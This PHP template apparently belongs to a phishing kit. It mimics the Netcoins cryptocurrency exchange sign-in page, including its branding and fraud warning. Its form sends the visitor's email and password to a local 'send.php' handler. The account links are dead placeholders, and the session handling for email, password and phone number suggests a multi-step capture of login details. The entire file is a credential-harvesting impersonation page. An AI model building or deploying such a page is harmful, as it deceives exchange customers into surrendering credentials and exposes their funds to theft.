<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    unset($_SESSION['email']);
    unset($_SESSION['password']);
    unset($_SESSION['phone_number']);
    $title = 'Sign in to Netcoins | Buy, Sell and Margin Trade Bitcoin (BTC) and Ethereum (ETH)';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div>
            <form method="post" action="<?= base_url('send.php') ?>" class="col-12 shadow-sm py17">
                <div class="input-group my20">
                    <span class="input-group-text bg-dark py15 px20 border border-dark"><i class="fa-regular fa-envelope text-white"></i></span>
                    <input name="email" type="text" maxlength="100" required="" class="form-control" placeholder="Enter your email" value="" >
                </div>
                <div class="input-group my20">
                    <span class="input-group-text bg-dark py15 px20 border border-dark"><i class="fa-solid fa-lock text-white"></i></span>
                    <input name="password" type="password" required="" minlength="3" maxlength="50"  class="form-control" placeholder="Enter your password" value="" >
                </div>
                <div class="my20 text-start fs14">
                    <a class="text-decoration-none text-primary-2" href="#">Forgot your password?</a>
                </div>
                <div class="text-center mx-auto d-grid my20">
                    <button type="submit" class="btn btn-primary btn-block">Sign In</button>
                </div>
                
                <div class="my20 text-start fs14">
                    Need an account?  <a class="text-decoration-none text-primary-2" href="#">Create an account</a>
                </div>
                <div class="p24 bg-secondar-2 rounded-3">
                    <div class="fs17 fw-bold mb10 fs14">Please be aware of fraudsters.</div>
                    <div class="fs12">Please do not accept money or purchase digital assets on behalf of any 3rd party. If you have been contacted or HIRED to take part in a transaction like this please contact us and we will explain the risks. You are at risk of losing your funds.</div>
                </div>
            </form>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>